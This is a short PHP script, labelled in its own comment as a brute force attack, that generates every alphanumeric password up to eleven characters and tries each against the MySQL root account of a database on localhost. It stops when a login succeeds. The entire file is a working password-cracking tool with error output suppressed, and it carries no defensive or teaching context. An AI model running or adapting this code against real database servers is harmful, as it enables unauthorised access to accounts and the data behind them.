<?php
	/*
	brute force attack
	*/
	error_reporting(0);
	define('PASSWORD_MAX_LEN',11);
	echo "Start\n";

	function connection($password)
	{
		$hostname = "localhost";
		$username = "root";
		$database = "lbb_staging_old";
		$port = "3306";
		// Create connection
		$conn = new mysqli($hostname, $username, $password, $database, $port);
		return $conn;	
	}

	function check($pass_str)
	{
		$conn=connection($pass_str);
		if($conn->connect_error)
			return false;
		else
			return true;
	}

	// init token
	$tokens=array();

	for($i=65;$i<=90;$i++)
		$tokens[]=chr($i);
	for($i=97;$i<=122;$i++)
		$tokens[]=chr($i);
	for($i=48;$i<=57;$i++)
		$tokens[]=chr($i);

	$tokenLength=count($tokens);

	function gen($str,$len,$maxlen)
	{
		global $tokens,$tokenLength;
		if(strlen($str)==$maxlen)
		{
			echo "$str\n";
			if(check($str))
				exit;
		}
		else
			for($i=0;$i<$tokenLength;$i++)
				gen($str.$tokens[$i],$len+1,$maxlen);
	}

	for($max=1;$max<=PASSWORD_MAX_LEN;$max++)
	{
		for($i=0;$i<$tokenLength;$i++)
		{
			gen($tokens[$i],1,$max);
		}
	}
?>